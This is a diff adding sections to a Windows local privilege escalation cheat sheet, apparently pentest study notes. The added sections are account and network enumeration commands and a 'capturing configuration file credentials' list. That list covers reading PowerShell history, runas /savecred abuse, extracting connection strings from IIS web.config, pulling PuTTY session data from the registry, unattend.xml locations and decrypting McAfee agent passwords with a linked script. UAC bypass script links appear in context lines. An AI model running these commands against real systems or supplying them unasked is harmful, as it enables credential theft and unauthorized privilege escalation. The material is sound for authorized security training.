@@ -1,4 +1,46 @@
 # Local Privilege Escalation Windows
+## Enumeration
+-> Enumerates all local accounts
+```
+net user
+```
+
+-> Get information from a specific user
+```
+net user <user>
+```
+
+-> Check user privileges
+```
+whoami /priv
+```
+
+-> View groups you belong to
+```
+whoami /groups
+```
+
+-> View interfaces and network information  
+```
+ipconfig /all
+```
+
+-> View all active TCP connections and the TCP and UDP ports the host is listening on
+```
+netstat -ant
+```
+
+-> List running processes
+```
+tasklist
+```
+
+-> View system tasks
+```
+schtasks
+```
+
+---
 
 ## Unquoted Service Path
 -> Detection 
@@ -102,6 +144,51 @@ https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-Event
 
 ### FodhelperBypass
 https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1
+
+### Capturing configuration file credentials
+-> Powershell History  
+```
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+-> EXploiting Saved Windows Credentials
+```
+cmdkey /list  
+runas /savecred /user:admin cmd.exe
+```
+
+-> IIS Configuration  
+```
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString  
+type C:\inetpub\wwwroot\web.config | findstr connectionString
+```
+  
+-> Retrieve Credentials from Software: PuTTY  
+```
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
+
+-> Unattended Windows Installations
+```
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+```
+  
+-> Identify  
+```
+dir /s *.db
+```
+-> McAfee Enterprise Endpoint Security - Credentials used during installation  
+
+```
+C:\ProgramData\McAfee\Agent\DB\ma.db
+sqlitebrowser ma.db
+python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
+```
+https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py
 
 ## Windows Enumeration Tools
 -> PowerUp.ps1  
